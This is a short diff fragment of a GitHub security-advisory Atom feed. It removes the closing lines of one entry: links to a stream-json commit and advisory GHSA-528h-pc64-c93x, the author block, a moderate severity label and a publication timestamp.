-<li><a href="https://github.com/uhop/stream-json/commit/a869fb98aaef9225556f49901a8f55954ff856e6">https://github.com/uhop/stream-json/commit/a869fb98aaef9225556f49901a8f55954ff856e6</a></li>
-<li><a href="https://github.com/advisories/GHSA-528h-pc64-c93x">https://github.com/advisories/GHSA-528h-pc64-c93x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-528h-pc64-c93x</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-03T20:27:53.000Z</published>
     </entry>
 </feed>
